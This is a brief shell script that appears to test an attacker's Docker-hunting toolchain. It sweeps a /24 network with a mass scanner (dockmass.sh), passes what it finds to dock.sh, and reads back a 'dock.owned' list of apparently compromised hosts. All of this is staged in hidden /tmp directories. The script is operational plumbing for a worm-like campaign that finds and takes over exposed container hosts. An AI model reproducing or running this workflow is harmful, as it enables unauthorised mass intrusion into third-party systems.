#!/bin/sh
# throwaway: dockmass end-to-end - our own /24 must be found, then handed to dock.sh
W=/tmp/.sysd/.hunt
: > "$W/mass.found"
grep -v '^167\.233\.74\.146$' "$W/dock.seen" > /tmp/s.9; mv -f /tmp/s.9 "$W/dock.seen"
echo "--- A: sweep our own /24 (positive control) ---"
MASS_BUDGET=60 MASS_NETS=167.233.74 sh /tmp/.sysd/dockmass.sh 2>&1 | tail -4
echo "--- mass.found ---"
cat "$W/mass.found"
echo "--- B: dock.sh must pick mass.found up as queue ---"
sh /tmp/.sysd/dock.sh 2>&1 | tail -6
echo "--- dock.owned ---"
cat "$W/dock.owned"
echo "--- mass.done lines ---"
wc -l < "$W/mass.done"
echo "--- container ---"
docker ps --format '{{.Names}} {{.Status}}'
